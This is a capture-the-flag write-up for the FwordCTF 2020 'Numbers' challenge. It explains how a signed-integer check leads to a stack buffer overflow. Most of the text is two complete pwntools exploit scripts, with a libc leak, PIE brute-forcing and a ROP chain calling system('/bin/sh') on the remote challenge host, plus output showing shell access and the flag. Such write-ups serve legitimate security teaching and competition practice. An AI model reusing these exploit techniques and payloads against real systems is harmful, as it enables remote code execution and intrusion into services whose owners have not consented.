# FwordCTF 2020

## Numbers

> 490
> 
> Do you like playing with numbers ?
>
> `nc numbers.fword.wtf 1237`
>
> Author : haflout
>
> [`Numbers`](numbers)

Tags: _pwn_ _x86-64_ _remote-shell_ _bof_ _rop_ _integer-overflow_


## Summary

Leverage an integer overflow to increase the number of bytes read to score a buffer overflow.

> There are two ways to solve this.  The _hard path_, that I ended up using since I assumed the buffer was initialized (dunno man, _tired? How I've done others like this?_), or the _easy path_ where you leak libc from an uninitialized buffer (hat tip to [po6ix](https://gist.githubusercontent.com/po6ix/31a1ed1b033b1ab23541c84e83de448d/raw/6b7c5047cf3596b7909e1e249156c7393b2c329b/numbers.py)).  I'll show both.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Most mitigations in place, however no stack canary; BOF -> ROP.

    
### Decompile with Ghidra

```c
void get_number(int *param_1)
{
  int iVar1;
  char local_10 [8];
  
  puts("\ndo you have any number in mind ??");
  read(0,local_10,8);
  iVar1 = atoi(local_10);
  *param_1 = iVar1;
  if (0x3c < *param_1) {
    puts("you\'re a naughty boy..");
    exit(1);
  }
  return;
}
```

`iVar1` is `int` and not `uint`, so a `-1` will pass the check, however...

```
undefined8 main(void)
{
  int iVar1;
  uint local_10;
  char local_9;
  
  setup_buffers();
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  do {
    get_number((int *)&local_10);
    vuln(local_10);
    puts("\ntry again ?");
    iVar1 = getchar();
    local_9 = (char)iVar1;
  } while (local_9 != 'n');
  return 0;
}
```

`main` passes the value from `get_number` as `uint` to `vuln` (defined as `uint local_10`):

```
undefined8 vuln(uint param_1)
{
  undefined local_48 [64];
  
  puts("are yo sure ??");
  read(0,local_48,(ulong)param_1);
  printf("%s",local_48);
  return 0;
}
```

Just to make extra sure you get all your bits, your way, `param_1` is cast to `ulong`.  IOW, a `-1` will get you all the bits you need and then some.  BOF -> ROP.

A libc leak will provide the necessary bits to pwn this challenge.

#### The _Easy Path_

The _easy path_ leaks libc directly from the stack.  `local_48` is uninitialized; let's take a look with GDB (gef):

```
0x00007ffc0d27c9f8│+0x0000: 0x00005556e8752945  →  lea rax, [rbp-0x40] ← $rsp
0x00007ffc0d27ca00│+0x0008: 0x00007ffc0d27cb50  →  0x0000000000000001
0x00007ffc0d27ca08│+0x0010: 0x0000000800000000
0x00007ffc0d27ca10│+0x0018: 0x0000000000000000  ← $rsi
0x00007ffc0d27ca18│+0x0020: 0x00007fdfda11b480  →  <atoi+16> add rsp, 0x8
0x00007ffc0d27ca20│+0x0028: 0x00007ffc0d27cb50  →  0x0000000000000001
0x00007ffc0d27ca28│+0x0030: 0x00005556e87528e9  →   mov edx, eax
0x00007ffc0d27ca30│+0x0038: 0x00007ffc0d27ca50  →  0x00007ffc0d27ca70  → 0x00005556e8752a70  →  push r15
0x00007ffc0d27ca38│+0x0040: 0x00007ffc0d27ca68  →  0x0000000000000008
0x00007ffc0d27ca40│+0x0048: 0x00007ffc0d27ca70  →  0x00005556e8752a70  → push r15
0x00007ffc0d27ca48│+0x0050: 0x00005556e8752738  →  <printf@plt+8> add BYTE PTR [rax], al
0x00007ffc0d27ca50│+0x0058: 0x00007ffc0d27ca70  →  0x00005556e8752a70  → push r15 ← $rbp
0x00007ffc0d27ca58│+0x0060: 0x00005556e8752a47  →  lea rdi, [rip+0xf6]        # 0x5556e8752b44
``` 

Above is the stack when being prompted `are yo sure ??`.  `local_48` is `0x48` bytes from the return address at offset `+0x0060`.  `0x60 - 0x48` puts the start of the `local_48` at `+0x0018`, just above a libc leak for `atoi+16`.  Just send 8 bytes and the `printf` after the `read` (see `vuln` above) will leak `atoi+16` and return back to `main` for a second pass.

#### The _Hard Path_

The _hard path_ assumes that the buffer is initialized.  Using the same trick as the _easy path_, however it's not just 8 bytes that need to be sent, it's `0x48`--the distance from the return address; and that is the target.  Leaking the return address will provide the base process address, from there, it's leaking libc using the GOT.

_What makes that so hard?_

Well, when `vuln` [_LEAVES_](https://www.felixcloutier.com/x86/leave), the stack pointer gets set to the garbage created by the buffer overflow that went through the saved base pointer (`$rbp` above) on the way to the return address (see offset `+0x0058` in the stack diagram above--that's what will be _moved_ to `RSP` on `LEAVE`).  On return, `main` will be unstable and unpredictable rendering a second pass governed by chance--or at least that was my experience when developing this exploit.

Leaking the saved base pointer is possible, but pointless because x86_64 addresses today are only 48 bits.  The two most significant bytes still have to be overflowed with non-zeros for `printf` to leak the return address.

The solution is to brute force the 4th to last nibble.  I know where I'd like to return to (top of `main`), but I only know the last 3 nibbles of `main` (disassemble it).


## Exploit

### Easy Path: Setup

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./numbers')
context.log_level = 'INFO'
context.log_file = 'log.log'

'''
# local libc
libc = binary.libc
p = process(binary.path)
'''
# task libc
libid = 'libc6_2.28-0ubuntu1_amd64'
libpath = os.getcwd() + '/libc-database/libs/' + libid + '/'
ld = ELF(libpath + 'ld-2.28.so')
libc = ELF(libpath + 'libc-2.28.so')
#p = process([ld.path, binary.path], env={'LD_LIBRARY_PATH': libpath})
#p = process([binary.path], env={'LD_LIBRARY_PATH': libpath})
p = remote('numbers.fword.wtf', 1237)
#'''
```

The setup above is the final version, but before we can get there, we'll start with our local libc block, then switch to the challenge libc after discovered.


### Easy Path: Leak libc

```python
p.sendafter('do you have any number in mind ??\n','8')
p.sendafter('are yo sure ??\n',8 * 'A')
_ = p.recv(14).strip()[-6:]
atoi = u64(_ + b'\x00\x00') - 16
log.info('atoi: ' + hex(atoi))
libc.address = atoi - libc.sym.atoi
log.info('baselibc: ' + hex(libc.address))
```

From the analysis section we determined `atoi+16` is leaked 8 bytes in, the above will just put 8 bytes, and then catch the leak from `printf`.

> NOTE: This is _not_ guaranteed to work with the challenge libc version.  The `+16` offset within `atoi` can vary from libc to libc.  The probably of this diverging increases as the offset increases, i.e. code changes.  When working on challenges like this where I'm using the stack to leak libc I try to be as close to the running environment as possible, e.g.:
> 
> ```
> # strings numbers | grep GCC
> GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
> ```
> 
> Based on the output above I used an Ubuntu 18 container as a starting point.

At this point, its time to leak `atoi` from the challenge server and use the [libc-database](https://github.com/niklasb/libc-database) to find the correct libc version and test.  Fortunately, the offset of `16` is the same.


### Easy Path: Get a shell, get a flag

```python
p.sendafter('try again ?\n','y')
p.sendafter('do you have any number in mind ??\n','-1')

rop = ROP([libc])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
log.info('pop_rdi: ' + hex(pop_rdi))

payload  = 0x48 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.sym.system)

p.sendafter('sure ??\n',payload)
p.recv(len(payload))
p.interactive()
```

With libc version and location in hand, get a shell.

Output:

```bash
# ./exploit-easy.py
[*] '/pwd/datajerk/fwordctf2020/numbers/numbers'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/pwd/datajerk/fwordctf2020/numbers/libc-database/libs/libc6_2.28-0ubuntu1_amd64/ld-2.28.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/pwd/datajerk/fwordctf2020/numbers/libc-database/libs/libc6_2.28-0ubuntu1_amd64/libc-2.28.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to numbers.fword.wtf on port 1237: Done
[*] atoi: 0x7fa9af25e470
[*] baselibc: 0x7fa9af21c000
[*] Loaded 196 cached gadgets for '/pwd/datajerk/fwordctf2020/numbers/libc-database/libs/libc6_2.28-0ubuntu1_amd64/libc-2.28.so'
[*] pop_rdi: 0x7fa9af23fa6f
[*] Switching to interactive mode
$ id
uid=1000(fword) gid=1000(fword) groups=1000(fword)
$ ls -l
total 32
-rw-r--r-- 1 root root    42 Aug 29 00:23 flag.txt
-rwxr-xr-x 1 root root  6120 Aug 29 15:39 numbers
-rwxr-xr-x 1 root root 18744 Aug 29 00:23 ynetd
$ cat flag.txt
FwordCTF{s1gN3d_nuMb3R5_c4n_b3_d4nG3r0us}
```


### Hard Path: Setup

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./numbers')
binary.symbols['main'] = 0x9c5
binary.symbols['entry'] = binary.symbols['main'] + 1
context.log_level = 'INFO'
context.log_file = 'log.log'

'''
# local libc
libc = binary.libc
'''
# task libc
libid = 'libc6_2.28-0ubuntu1_amd64'
libpath = os.getcwd() + '/libc-database/libs/' + libid + '/'
ld = ELF(libpath + 'ld-2.28.so')
libc = ELF(libpath + 'libc-2.28.so')
#'''
```

The setup above is the final version, but before we can get there, we'll start with our local libc block, then switch to the challenge libc after discovered.

`binary.symbols['main']` and `binary.symbols['entry']` add symbols to the stripped `./numbers` symbol table.  More on this below.


### Hard Path: Brute force base process address

```python
while True:
    #p = process(binary.path)
    #p = process([ld.path, binary.path], env={'LD_LIBRARY_PATH': libpath})
    #p = process([binary.path], env={'LD_LIBRARY_PATH': libpath})
    p = remote('numbers.fword.wtf', 1237)

    p.sendafter('do you have any number in mind ??\n','-1')
    payload  = 0x48 * b'A'
    payload += p16(binary.symbols['entry'] & 0xffff)
    p.sendafter('are yo sure ??\n',payload)

    _ = p.recv(0x48)
    if _ not in 0x48 * b'A':
        p.close()
        continue
    _ = p.recv(6)
    try:
        entry = u64(_ + b'\x00\x00')
    except:
        p.close()
        continue

    log.info('entry: ' + hex(entry))
    binary.address = entry & (2 ** 64 - 0x1000)
    log.info('binary.address: ' + hex(binary.address))
    log.info('entry: ' + hex(binary.sym.entry))

    try:
        p.sendafter('do you have any number in mind ??\n','-1')
        break
    except:
        p.close()
        continue
```

This loop essentially brute forces the 4th nibble.  Or better put, assumes the 4th nibble is `0` and just keeps trying until it does not fail.  ASLR will eventually (1 in 16) have `0` as the 4th nibble.  This works pretty quickly (less than 30 seconds).

Take note, that we're trying to _return_ to `entry` (`main+1`) vs. `main`.  This is to fix a [stack alignment](https://blog.binpang.me/2019/07/12/stack-alignment/) issue with `printf`.  The +1 skips the initial `push rbp` at the beginning of `main`.  Without this, `printf` will segfault in `vuln`.

If the stack were initialized this may be one of the only ways to leak.


### Hard Path: Leak libc

```python
p.recvuntil('are yo sure ??\n')

rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
log.info('pop_rdi: ' + hex(pop_rdi))

payload  = 0x48 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.symbols['entry'])

p.send(payload)

_ = p.recvuntil('do you ')[-15:][:6]
puts = u64(_ + b'\x00\x00')
log.info('puts: ' + hex(puts))
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))
```

With the base process address leaked, leaking libc with the GOT is trivial.  And, it is necessary again to return to `main+1` (`entry`) to avoid a `printf` segfault for the final pass.


### Hard Path: Get a shell, get a flag

```python
p.sendafter('have any number in mind ??\n','-1')

payload  = 0x48 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.sym.system)

p.sendafter('sure ??\n',payload)
p.recv(len(payload))
p.interactive()
```

Not much different that the _easy path_ at this point.

Output:

```bash
# ./exploit.py
[*] '/pwd/datajerk/fwordctf2020/numbers/numbers'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/pwd/datajerk/fwordctf2020/numbers/libc-database/libs/libc6_2.28-0ubuntu1_amd64/ld-2.28.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/pwd/datajerk/fwordctf2020/numbers/libc-database/libs/libc6_2.28-0ubuntu1_amd64/libc-2.28.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to numbers.fword.wtf on port 1237: Done
[*] entry: 0x562c4e7409c6
[*] binary.address: 0x562c4e740000
[*] entry: 0x562c4e7409c6
[*] Closed connection to numbers.fword.wtf port 1237
[+] Opening connection to numbers.fword.wtf on port 1237: Done
[*] Closed connection to numbers.fword.wtf port 1237
[+] Opening connection to numbers.fword.wtf on port 1237: Done
[*] entry: 0x55a2814f09c6
[*] binary.address: 0x55a2814f0000
[*] entry: 0x55a2814f09c6
[*] Closed connection to numbers.fword.wtf port 1237
[+] Opening connection to numbers.fword.wtf on port 1237: Done
[*] entry: 0x564f797d09c6
[*] binary.address: 0x564f797d0000
[*] entry: 0x564f797d09c6
[*] Closed connection to numbers.fword.wtf port 1237
[+] Opening connection to numbers.fword.wtf on port 1237: Done
[*] entry: 0x55da8ae009c6
[*] binary.address: 0x55da8ae00000
[*] entry: 0x55da8ae009c6
[*] Closed connection to numbers.fword.wtf port 1237
[+] Opening connection to numbers.fword.wtf on port 1237: Done
[*] entry: 0x55b74b7c09c6
[*] binary.address: 0x55b74b7c0000
[*] entry: 0x55b74b7c09c6
[*] Loaded 14 cached gadgets for './numbers'
[*] pop_rdi: 0x55b74b7c0ad3
[*] puts: 0x7f225a0f5010
[*] libc.address: 0x7f225a074000
[*] Switching to interactive mode
$ id
uid=1000(fword) gid=1000(fword) groups=1000(fword)
$ ls -l
total 32
-rw-r--r-- 1 root root    42 Aug 29 00:23 flag.txt
-rwxr-xr-x 1 root root  6120 Aug 29 15:39 numbers
-rwxr-xr-x 1 root root 18744 Aug 29 00:23 ynetd
$ cat flag.txt
FwordCTF{s1gN3d_nuMb3R5_c4n_b3_d4nG3r0us}
```

